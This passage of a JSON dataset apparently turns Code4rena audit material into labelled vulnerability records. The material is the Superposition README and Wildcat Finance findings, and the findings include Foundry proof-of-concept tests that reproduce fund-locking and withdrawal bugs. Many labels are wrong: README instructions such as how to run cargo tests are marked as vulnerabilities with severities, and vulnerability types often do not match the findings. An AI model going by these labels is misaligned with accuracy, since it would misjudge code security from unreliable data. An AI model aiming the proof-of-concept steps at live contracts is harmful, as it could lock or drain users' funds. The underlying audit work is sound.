    "severity": "Low",
    "title": "End to end testing with a live instance isn't possible?",
    "description": "At the time of writing, the `cargo-stylus` toolchain is not verifying compiled blobs correctly in our limited testing. For now, tests will need to be run entirely in the testing suite without real-world interaction, which is fine, since we have some functions that let you enforce restrictions on the amount of ERC20 that's transferred around.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 26,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.72,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "ethers_suite_swapping_with_permit2_blobs_no_permit2",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "How do I run tests with debug logging/use a specific feature/run a specific test?",
    "description": "Run your tests like so: cargo test --features testing,testing-dbg,admin --package seawater -- ethers_suite_swapping_with_permit2_blobs_no_permit2 --nocapture This would run tests with logging (with the feature `testing-dbg`), run only Seawater (`seawater`), the specific test `ethers_suite_swapping_with_permit2_blobs_no_permit2`, and it will log everything.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.051,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "ethers_suite_orchestrated_uniswap_two",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Why are some tests failing?",
    "description": "We left the failing test `incr_position_fee_growth_tick` as a a trailhead for any researchers to understand whether they are symptomatic of a larger problem. This is an issue that cropped up during testnet, though we're not fully sure as to whether this is an issue caused by the original configuration of the contract (delta could be 0 during swaps).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-08-superposition/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ * It is possible for someone to grief the protocol by creating a pool with bad configuration. * It is possible for the permissioned account to do things to grief the protocol.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " are issues that cropped up in production that we isolated by reproducing the remote state into our contracts. the production contract was deployed at one point with a change from the current version of this code that we believe may have contributed to causing this to happen.\n2. ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Running tests",
    "description": "See [pkg/README](https://github.com/code-423n4/2024-08-superposition/blob/main/pkg/README.md#building) for a detailed explanation Then run the following command: https://github.com/code-423n4/2024-08-superposition cd 2024-08-superposition/pkg rustup target add wasm32-unknown-unknown",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.28,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "cargo test\n--features=testing,testing-dbg-erc20 -- --nocapture",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Cargo test tracing",
    "description": "Some of the cargo tests have optional logging, which might help with debugging. To see these logs, enable the `testing-dbg-<test>` feature and run the tests without capturing stdout, ie `cargo test --features=testing,testing-dbg-erc20 -- --nocapture`. Testing tools are available with the `with_storage` macro, which lets you set slots and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_deadrosesxyzissue() external {\n    parameters.annualInterestBips = 3650;\n    _deposit(alice, 1e18);\n    _deposit(bob, 0.5e18);\n    address laurence = address(1337);\n    _deposit(laurence, 0.5e18);\n    fastForward(200 weeks);\n\n    vm.startPrank(borrower);\n    asset.approve(address(market), 10e18);\n    asset.mint(borrower, 10e18);\n\n    vm.stopPrank();\n    vm.prank(alice);\n    uint32 expiry = market.queueFullWithdrawal();       // alice queues large withdraw\n\n    vm.prank(borrower);\n    market.closeMarket();                               // market is closed\n\n    market.executeWithdrawal(alice, expiry);     // alice withdraws at the current rate\n\n    vm.startPrank(bob);\n    for (uint i; i < 10; i++) {\n      market.queueWithdrawal(1);        // bob does multiple small withdraw requests just so they round down the batch's overall rate\n    }\n    market.queueFullWithdrawal();\n    vm.stopPrank();\n    vm.prank(laurence);\n    market.queueFullWithdrawal();\n\n    market.executeWithdrawal(bob, expiry);     // bob can successfully withdraw all of his funds\n\n    vm.expectRevert();\n    market.executeWithdrawal(laurence, expiry);    // laurence cannot withdraw his funds. Scammer get scammed.\n\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[[H-01] User could withdraw more than supposed to, forcing last user withdraw to fail](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64)* Within Wildcat, withdraw requests are put into batches. Users first queue their withdraws and whenever there's sufficient liquidity, they're filled at the current rate. Usually, withdraw requests are only executable after the expiry passes and then all users within the batch get a cut from the `batch.normalizedAmountPaid` proportional to the scaled amount they've requested a withdraw for. uint128 newTotalWithdrawn = uint128( MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount) );",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "state.normalizedUnclaimedRewards",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Although it's not a clean fix, consider adding a `addNormalizedUnclaimedRewards` function which can only be called after a market is closed. It takes token from the user and increases the global variable `state.normalizedUnclaimedRewards`. The invariant would remain broken, but it will make sure no funds are permanently stuck. **[laurenceday (Wildcat) confirmed and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64#issuecomment-2388311632):** > We're going to have to dig into this, but we're confirming. Thank you! **[3docSec (judge) commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64#issuecomment-2391436961):** > I am confirming as High, under the assumption that funds can't be recovered (didn't see a `cancelWithdrawal` or similar option).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.032,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "pendingWithdrawalExpiry",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "Recommended Mitigation Steps",
    "description": "After closing a market and filling the current expiry, delete it from `pendingWithdrawalExpiry`. Introduce a `closedExpiry` variable so you later make sure a future expiry is not made at that same timestamp to avoid collision. **[d1ll0n (Wildcat) confirmed and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/121#issuecomment-2403567138):** > Thanks for this, good find! Will adopt the proposed solution and see if it fixes [H-01](https://github.com/code-423n4/2024-08-wildcat-findings/issues/64). **[laurenceday (Wildcat) commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/121#issuecomment-2406134173):** > Fixed with [wildcat-finance/v2-protocol@b25e528](https://github.com/wildcat-finance/v2-protocol/commit/b25e528420617504f1ae6393b4be281a967c3e41).",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/access/FixedTermLoanHooks.sol\n960:   function onSetAnnualInterestAndReserveRatioBips(\n961:     uint16 annualInterestBips,\n962:     uint16 reserveRatioBips,\n963:     MarketState calldata intermediateState,\n964:     bytes calldata hooksData\n965:   )\n966:     public\n967:     virtual\n968:     override\n969:     returns (uint16 updatedAnnualInterestBips, uint16 updatedReserveRatioBips)\n970:   {\n971:     return\n972:       super.onSetAnnualInterestAndReserveRatioBips(\n973:         annualInterestBips,\n974:         reserveRatioBips,\n975:         intermediateState,\n976:         hooksData\n977:       );\n978:   }\n979: \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Vulnerability details",
    "description": "In Wildcat markets, lenders know in advance how much `APR` the borrower will pay them. In order to allow lenders to exit the market swiftly, the market must always have at least a `reserve ratio` of the lender funds ready to be withdrawn. If the borrower decides to [reduce the `APR`](https://docs.wildcat.finance/using-wildcat/day-to-day-usage/borrowers#reducing-apr), in order to allow lenders to 'ragequit', a new `reserve ratio` is calculated based on the variation of the APR as described in the link above. Finally, is a market implement a fixed term (date until when withdrawals are not possible), it shouldn't be able to reduce the APR, as this would allow the borrower to 'rug' the lenders by reducing the APR to 0% while they couldn't do anything against that. The issue here is that while lenders are (as expected) prevented to withdraw before end of term:<br> <https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L857-L859>",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.632,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "FixedTermLoanHooks::onSetAnnualInterestAndReserveRatioBips",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Recommended Mitigation Steps",
    "description": "When `FixedTermLoanHooks::onSetAnnualInterestAndReserveRatioBips` is called, revert if `market.fixedTermEndTime > block.timestamp`. **[laurenceday (Wildcat) disputed and commented via duplicate issue \\#23](https://github.com/code-423n4/2024-08-wildcat-findings/issues/23#issuecomment-2368151696):** > This is a valid finding, thank you - an embarrassing one for us at that, we clearly just missed this when writing the hook templates! > > However, we're a bit torn internally on whether this truly classifies as a High. We've definitely specified in documentation that this is a rug pull mechanic, but there are no funds directly or indirectly at risk here, unless you classify the potential of _earning_ less than expected when you initially deposited as falling in that bucket.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.058,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_inconsistencyIssue() external {\n      parameters.annualInterestBips = 3650;\n      _deposit(alice, 1e18);\n      uint256 borrowAmount = market.borrowableAssets();\n      vm.prank(borrower);\n      market.borrow(borrowAmount);\n      vm.prank(alice);\n      market.queueFullWithdrawal();\n      fastForward(52 weeks);\n\n      asset.mint(borrower, 10e18);\n      vm.startPrank(borrower);\n      asset.approve(address(market), 10e18);\n      uint256 initBalance = asset.balanceOf(borrower); \n\n      asset.transfer(address(market), 10e18);\n      market.closeMarket();\n      uint256 finalBalance = asset.balanceOf(borrower);\n      uint256 paid = initBalance - finalBalance;\n      console.log(paid);\n\n  } \n\n    function test_inconsistencyIssue2() external {\n      parameters.annualInterestBips = 3650;\n      _deposit(alice, 1e18);\n      uint256 borrowAmount = market.borrowableAssets();\n      vm.prank(borrower);\n      market.borrow(borrowAmount);\n      vm.prank(alice);\n      market.queueFullWithdrawal();\n      fastForward(52 weeks);\n\n      asset.mint(borrower, 10e18);\n      vm.startPrank(borrower);\n      asset.approve(address(market), 10e18);\n      uint256 initBalance = asset.balanceOf(borrower); \n\n\n      market.closeMarket();\n      uint256 finalBalance = asset.balanceOf(borrower);\n      uint256 paid = initBalance - finalBalance;\n      console.log(paid);\n\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "[[M-03] Inconsistency across multiple repaying functions causing lender to pay extra fees](https://github.com/code-423n4/2024-08-wildcat-findings/issues/62)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/62), also found by [Bigsam](https://github.com/code-423n4/2024-08-wildcat-findings/issues/100), [0xNirix](https://github.com/code-423n4/2024-08-wildcat-findings/issues/96), [Udsen](https://github.com/code-423n4/2024-08-wildcat-findings/issues/72), [Takarez](https://github.com/code-423n4/2024-08-wildcat-findings/issues/47), and [Infect3d](https://github.com/code-423n4/2024-08-wildcat-findings/issues/73)* Within functions such as `repay` and `repayAndProcessUnpaidWithdrawalBatches`, funds are first pulled from the user in order to use them towards the currently expired, but not yet unpaid batch, and then the updated state is fetched. function repay(uint256 amount) external nonReentrant sphereXGuardExternal { if (amount == 0) revert_NullRepayAmount(); asset.safeTransferFrom(msg.sender, address(this), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 47,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function onQueueWithdrawal(\n    address lender,\n    uint32 /* expiry */,\n    uint /* scaledAmount */,\n    MarketState calldata /* state */,\n    bytes calldata hooksData\n  ) external override {\n    HookedMarket memory market = _hookedMarkets[msg.sender];\n    if (!market.isHooked) revert NotHookedMarket();\n    if (market.fixedTermEndTime > block.timestamp) {\n      revert WithdrawBeforeTermEnd();\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[[M-04] `FixedTermLoanHook` looks at `block.timestamp` instead of `expiry`](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60)* The idea of `FixedTermLoanHook` is to only allow for withdrawals after a certain term end time. However, the problem is that the current implementation does not look at the expiry, but instead at the `block.timestamp`. function onQueueWithdrawal( address lender, uint32 /* expiry */,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "fixedTermEndTime = value - withdrawalBatchDuration",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Check the `expiry` instead of `block.timestamp`. **[d1ll0n (Wildcat) confirmed](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60#event-14486191444)** **[laurenceday (Wildcat) acknowledged and commented](https://github.com/code-423n4/2024-08-wildcat-findings/issues/60#issuecomment-2403650325):** > We've reflected on this a little bit, and decided that we want to turn this from a confirmed into an acknowledge. >",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.05,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  /**\n   * @dev Grants a role to an account by updating the account's status.\n   *      Can only be called by an approved role provider.\n   *\n   *      If the account has an existing credential, it can only be updated if:\n   *      - the previous credential's provider is no longer supported, OR\n   *      - the caller is the previous role provider, OR\n   *      - the new expiry is later than the current expiry\n   */\n  function grantRole(address account, uint32 roleGrantedTimestamp) external {\n    RoleProvider callingProvider = _roleProviders[msg.sender];\n\n    if (callingProvider.isNull()) revert ProviderNotFound();\n\n    _grantRole(callingProvider, account, roleGrantedTimestamp);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[[M-05] Role providers can bypass intended restrictions and lower expiry set by other providers](https://github.com/code-423n4/2024-08-wildcat-findings/issues/57)",
    "description": "*Submitted by [deadrxsezzz](https://github.com/code-423n4/2024-08-wildcat-findings/issues/57), also found by [0x1771](https://github.com/code-423n4/2024-08-wildcat-findings/issues/86) and [gesha17](https://github.com/code-423n4/2024-08-wildcat-findings/issues/10)* https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol#L413 If we look at the code comments, we'll see that role providers can update a user's credential only if at least one of the 3 is true: *   the previous credential's provider is no longer supported, OR *   the caller is the previous role provider, OR",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.7,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function test_closeMarket_BeforeFixedTermExpired() external {\n    //@audit-info deploy a FixedTermLoanHooks template\n    address fixedTermHookTemplate = LibStoredInitCode.deployInitCode(type(FixedTermLoanHooks).creationCode);\n    hooksFactory.addHooksTemplate(\n      fixedTermHookTemplate,\n      'FixedTermLoanHooks',\n      address(0),\n      address(0),\n      0,\n      0\n    );\n    \n    vm.startPrank(borrower);\n    //@audit-info borrower deploy a FixedTermLoanHooks hookInstance\n    address hooksInstance = hooksFactory.deployHooksInstance(fixedTermHookTemplate, '');\n    DeployMarketInputs memory parameters = DeployMarketInputs({\n      asset: address(asset),\n      namePrefix: 'name',\n      symbolPrefix: 'symbol',\n      maxTotalSupply: type(uint128).max,\n      annualInterestBips: 1000,\n      delinquencyFeeBips: 1000,\n      withdrawalBatchDuration: 10000,\n      reserveRatioBips: 10000,\n      delinquencyGracePeriod: 10000,\n      hooks: EmptyHooksConfig.setHooksAddress(address(hooksInstance))\n    });\n    //@audit-info borrower deploy a market hooked by a FixedTermLoanHooks hookInstance\n    address market = hooksFactory.deployMarket(\n      parameters,\n      abi.encode(block.timestamp + (365 days)),\n      bytes32(uint(1)),\n      address(0),\n      0\n    );\n    vm.stopPrank();\n    //@audit-info lenders can only withdraw their asset one year later\n    assertEq(FixedTermLoanHooks(hooksInstance).getHookedMarket(market).fixedTermEndTime, block.timestamp + (365 days));\n    //@audit-info alice deposit 50K asset into market\n    vm.startPrank(alice);\n    asset.approve(market, type(uint).max);\n    WildcatMarket(market).depositUpTo(50_000e18);\n    vm.stopPrank();\n    //@audit-info borrower close market in advance\n    vm.prank(borrower);\n    WildcatMarket(market).closeMarket();\n    //@audit-info the market is closed\n    assertTrue(WildcatMarket(market).isClosed());\n    //@audit-info however, alice can not withdraw her asset due to the unexpired fixed term.\n    vm.expectRevert(FixedTermLoanHooks.WithdrawBeforeTermEnd.selector);\n    vm.prank(alice);\n    WildcatMarket(market).queueFullWithdrawal();\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "[[M-06] No lender is able to exit even after the market is closed](https://github.com/code-423n4/2024-08-wildcat-findings/issues/52)",
    "description": "*Submitted by [0xpiken](https://github.com/code-423n4/2024-08-wildcat-findings/issues/52), also found by [josephxander](https://github.com/code-423n4/2024-08-wildcat-findings/issues/101) and [0xNirix](https://github.com/code-423n4/2024-08-wildcat-findings/issues/87)* When a borrower creates a market hooked by a [fixed-term hook](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol), all lenders are prohibited from withdrawing their assets from the market before the fixed-term time has elapsed. The borrower can close the market at any time. However, `fixedTermEndTime` of the market is not updated, preventing lenders from withdrawing their assets if `fixedTermEndTime` has not yet elapsed. Copy below codes to [WildcatMarket.t.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/test/market/WildcatMarket.t.sol) and run forge test --match-test test_closeMarket_BeforeFixedTermExpired: function test_closeMarket_BeforeFixedTermExpired() external {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 55,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n  constructor(address _deployer, bytes memory /* args */) IHooks() {\n    borrower = _deployer;\n    // Allow deployer to grant roles with no expiry\n    _roleProviders[_deployer] = encodeRoleProvider(\n      type(uint32).max,\n      _deployer,\n      NotPullProviderIndex\n    );\n    HooksConfig optionalFlags = encodeHooksConfig({\n      hooksAddress: address(0),\n      useOnDeposit: true,\n      useOnQueueWithdrawal: false,\n      useOnExecuteWithdrawal: false,\n      useOnTransfer: true,\n      useOnBorrow: false,\n      useOnRepay: false,\n      useOnCloseMarket: false,\n      useOnNukeFromOrbit: false,\n      useOnSetMaxTotalSupply: false,\n      useOnSetAnnualInterestAndReserveRatioBips: false,\n      useOnSetProtocolFeeBips: false\n    });\n    HooksConfig requiredFlags = EmptyHooksConfig\n      .setFlag(Bit_Enabled_SetAnnualInterestAndReserveRatioBips)\n+     .setFlag(Bit_Enabled_CloseMarket);\n      .setFlag(Bit_Enabled_QueueWithdrawal);\n    config = encodeHooksDeploymentConfig(optionalFlags, requiredFlags);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "When a market hooked by a fixed-term hook is closed, `fixedTermEndTime` should be set to `block.timestamp` if it has not yet elapsed: constructor(address _deployer, bytes memory /* args */) IHooks() { borrower = _deployer; // Allow deployer to grant roles with no expiry _roleProviders[_deployer] = encodeRoleProvider(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "powershell\nTraces:\n  [141487] AuditMarket::test_PoC_EOA_provider()\n    \u251c\u2500 [0] VM::startPrank(BORROWER1: [0xB193AC639A896a0B7a0B334a97f0095cD87427f2])\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [30181] AccessControlHooks::addRoleProvider(RoleProvider: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [2275] RoleProvider::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] false\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: RoleProvider: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], timeToLive: 2592000 [2.592e6], pullProviderIndex: 16777215 [1.677e7])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [74541] AccessControlHooks::addRoleProvider(RoleProvider: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [2275] RoleProvider::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: RoleProvider: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], timeToLive: 2592000 [2.592e6], pullProviderIndex: 0)\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [27653] AccessControlHooks::addRoleProvider(EOA_PROVIDER1: [0x6aAfF89c996cAa2BD28408f735Ba7A441276B03F], 2592000 [2.592e6])\n    \u2502   \u251c\u2500 [0] EOA_PROVIDER1::isPullProvider()\n    \u2502   \u2502   \u2514\u2500 \u2190 [Stop]\n    \u2502   \u251c\u2500 emit RoleProviderAdded(providerAddress: EOA_PROVIDER1: [0x6aAfF89c996cAa2BD28408f735Ba7A441276B03F], timeToLive: 2592000 [2.592e6], pullProviderIndex: 16777215 [1.677e7])\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u2514\u2500 \u2190 [Stop]\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Replace the interface call with a low-level call and check if the user implements the interface in order to be a pull provider: (bool succes, bytes memory data) = providerAddress.call(abi.encodeWithSelector(IRoleProvider.isPullProvider.selector)); bool isPullProvider; if (succes && data.length == 0x20) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nIf the caller is not a hooked market, the statement `!isKnownLenderOnMarket[lender][msg.sender]`, will return true, because the lender will be unknown. As a result the `_tryValidateAccess()` function will be executed for any `lender` and any `hooksData` passed. The call to [`_tryValidateAccess()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L698) will forward the call to [`_tryValidateAccessInner()`](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L654). Choosing a lender of arbitrary address, say `address(1)` will cause the function to attempt to retrieve the credential via the call to [\\_handleHooksData()](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L670), since the lender will have no previous provider or credentials.\n\nAs a result, the \\_handleHooksData function will forward the call to the encoded provider in the hooksData and will forward the extra hooks data as well, say merkle proof, or any arbitrary malicious data.\n\n<https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L617>\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "The `onQueueWithdrawal()` function does not check if the msg.sender is a hooked market, which is standart in virtually all other hooks: <https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol#L812> /** * @dev Called when a lender attempts to queue a withdrawal. *      Passes the check if the lender has previously deposited or received",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function enforceParameterConstraints(\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) internal view virtual {\n//snip\n    assertValueInRange(\n      reserveRatioBips,\n      MinimumReserveRatioBips,\n      MaximumReserveRatioBips,\n      ReserveRatioBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      delinquencyGracePeriod,\n      MinimumDelinquencyGracePeriod,\n      MaximumDelinquencyGracePeriod,\n      DelinquencyGracePeriodOutOfBounds.selector\n    );\n  }\n",
    "vulnerability_label": 1,
